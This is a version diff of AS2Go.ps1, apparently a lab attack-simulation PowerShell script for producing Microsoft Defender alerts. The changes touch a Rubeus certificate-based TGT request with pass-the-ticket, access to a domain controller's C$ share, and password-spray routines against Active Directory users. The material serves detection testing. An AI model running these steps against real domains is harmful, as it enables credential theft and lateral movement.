@@ -21,7 +21,7 @@ My goal is to create expressive and representative Microsoft Defender for Endpoi
 .NOTES
 
 last update: 2022-11-13
-File Name  : AS2Go.ps1 | Version 2.5.8
+File Name  : AS2Go.ps1 | Version 2.5.9
 Author     : Holger Zimmermann | me@mrhozi.com | @HerrHozi
 
 
@@ -84,8 +84,8 @@ Param (
 
 [bool]$showStep = $true # show the steps in an image
 
-$lastupdate   = "2022-11-10"
-$version      = "2.5.8.0" 
+$lastupdate   = "2022-11-13"
+$version      = "2.5.9.0" 
 $path         =  Get-Location
 $scriptName   =  $MyInvocation.MyCommand.Name
 $scriptLog    = "$path\$scriptName.log"
@@ -183,34 +183,26 @@ Write-Log -Message "### Start Function $myfunction ###"
 #$password = Read-Host "Enter password for pfx file - $pfxFile"
 $request = ".\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /ptt"
 
-Write-Host "`nNext Step:"
+Write-Host "`nNext Step: " -NoNewline
 Write-Host $request -ForegroundColor $global:FGCCommand
+Write-Host ""
 Write-Log -Message $request
 
 pause
 
-Write-Host "Before"
-dir $env:LOGONSERVER\c$
+$directory = "\\$myDC\c$"
+Get-Directories -Path $directory
 pause
 
 #Invoke-Command -ScriptBlock {.\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /password:$password /ptt} | Out-Host
-Invoke-Command -ScriptBlock {.\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile} | Out-Host
+Invoke-Command -ScriptBlock {.\Rubeus.exe asktgt /user:$altname /certificate:$pfxFile /ptt} | out-host
 
 pause
-dir $env:LOGONSERVER\c$
-
+$directory = "\\$myDC\c$"
+Get-Directories -Path $directory
 pause
 
-Try
-{
-Enter-PSSession -ComputerName $env:USERDNSDOMAIN -ErrorAction Stop
-}
-Catch
-{
-    $message = $_
-    Write-Host " "$message.CategoryInfo.Reason:" " -NoNewline
-    $message.Exception
-}
+klist
 pause
 
 Write-Log -Message "    >> using $PfxFile"
@@ -539,7 +531,7 @@ function Prepare-BruceForceAttack{
 $myfunction = Get-FunctionName
 Write-Log -Message "### Start Function $myfunction ###"
 #####
-
+$specChar = [char]0x00BB
 Write-Host "`nCurrent Default Domain Password Policy Settings:" -ForegroundColor $global:FGCHighLight
 Get-ADDefaultDomainPasswordPolicy
 
@@ -627,6 +619,15 @@ pause
 Start-PasswordSprayAttack -Domain $MyDomain -Password $MyPW01 -SearchBase $MyPath -NoR "1 of 2"
 Start-PasswordSprayAttack -Domain $MyDomain -Password $MyPW02 -SearchBase $MyPath -NoR "2 of 2"
 
+        If ($DeveloperMode) {
+              $user =   $MyDomain + "\" + $env:USERNAME
+              Write-Host "Bingo $specChar found User: " -NoNewline; Write-Host $User -ForegroundColor Yellow -NoNewline
+              Write-Host " with Password: " -NoNewline;Write-Host $MyPW01 -ForegroundColor Yellow
+             }
+
+
+
+
 $question = "`nDo you also want to run a Password Spray attack with rubues.exe - Y or N? Default "
 $prompt   = Get-Answer -question $question -defaultValue $no
 
@@ -697,12 +698,7 @@ Function Start-PasswordSprayAttack {
         Write-Progress -Activity "Run Password Spray # $NoR against user $User" -Status "Ready" -Completed
         
         
-        If ($DeveloperMode) {
-              $ADUSer = Get-ADUser -Filter * -SearchBase $SearchBase | Sort-Object{Get-Random} | Select -First 1
-              $user =   $Domain + "\" + $ADUSer.samaccountname
-              Write-Host "Bingo $specChar found User: " -NoNewline; Write-Host $User -ForegroundColor Yellow -NoNewline
-              Write-Host " with Password: " -NoNewline;Write-Host $Password -ForegroundColor Yellow
-             }
+
 
 #####
 Write-Log -Message "### End Function $myfunction ###"
@@ -2194,8 +2190,7 @@ Get-ADDomainController -filter *| ft hostname, IPv4Address, ISReadOnly, IsGlobal
 Write-Host ""
 #workaround
 $directory = "\\$myDC\c$"
-(Get-Directories -Path $directory) | Out-File -FilePath $tmp
-Get-Content -Path $tmp
+Get-Directories -Path $directory
 Write-Host ""
 Write-Host ""
 Pause
@@ -2666,6 +2661,8 @@ If ($DeveloperMode)
 # function to test 
 #Restart-VictimMachines
 Write-host "START Run directy" -ForegroundColor Red
+
+#Get-KerberosTGT -pfxFile "da-20221102.pfx" -altname "da-herrhozi"
 
 #write-host $mydebug
 
